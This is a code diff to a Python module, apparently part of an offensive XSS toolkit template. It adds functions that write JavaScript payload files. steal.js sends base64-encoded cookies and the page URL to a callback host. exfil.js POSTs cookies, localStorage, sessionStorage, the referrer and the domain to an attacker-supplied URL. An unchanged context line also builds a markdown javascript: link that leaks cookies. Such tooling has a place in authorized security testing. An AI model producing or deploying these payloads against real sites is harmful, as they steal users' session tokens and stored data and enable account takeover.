@@ -3,6 +3,10 @@
 
 from typing import List, Optional
 from urllib.parse import quote
+from pathlib import Path
+
+from {{cookiecutter.project_slug}}.utils.paths import get_payloads_dir
+from {{cookiecutter.project_slug}}.utils.output import out
 
 
 def cookie_stealer(callback_url: str, b64: bool = True) -> str:
@@ -180,6 +184,66 @@ def quick_test(callback_url: str) -> str:
 def markdown_xss(callback_url: str) -> str:
     """XSS for markdown contexts"""
     return f'[clickme](javascript:fetch("{callback_url}/queue?cookie="%2Bdocument.cookie))'
+
+
+def write_payload(filename: str, content: str, subdir: str = "xss") -> str:
+    """Write XSS payload to payloads/xss/ directory
+
+    Args:
+        filename: Name of file to write
+        content: JavaScript/HTML content
+        subdir: Subdirectory under payloads/ (default: xss)
+
+    Returns:
+        Relative path for serving (e.g., "xss/payload.js")
+    """
+    payload_dir = get_payloads_dir() / subdir
+    payload_dir.mkdir(parents=True, exist_ok=True)
+
+    filepath = payload_dir / filename
+    filepath.write_text(content)
+
+    out.info(f"XSS payload written to {filepath}")
+
+    # Return relative path for serving
+    return f"{subdir}/{filename}"
+
+
+def generate_stealer_js(callback_url: str) -> str:
+    """Generate and write a cookie stealer JavaScript file
+
+    Creates: payloads/xss/steal.js
+    Returns: Relative path for serving
+    """
+    content = f'''// Auto-generated XSS payload
+fetch('{callback_url}/queue?cookie='+btoa(document.cookie)+'&url='+btoa(window.location.href));'''
+
+    return write_payload("steal.js", content)
+
+
+def generate_full_exfil_js(callback_url: str) -> str:
+    """Generate and write a full data exfiltration JavaScript file
+
+    Creates: payloads/xss/exfil.js
+    Returns: Relative path for serving
+    """
+    content = f'''// Full data exfiltration
+let data = {{
+    cookie: document.cookie,
+    url: window.location.href,
+    referrer: document.referrer,
+    domain: document.domain,
+    title: document.title,
+    localStorage: Object.entries(window.localStorage || {{}}),
+    sessionStorage: Object.entries(window.sessionStorage || {{}})
+}};
+fetch('{callback_url}', {{
+    method: 'POST',
+    headers: {{'Content-Type': 'application/json'}},
+    body: JSON.stringify(data)
+}});'''
+
+    return write_payload("exfil.js", content)
 
 
 if __name__ == "__main__":
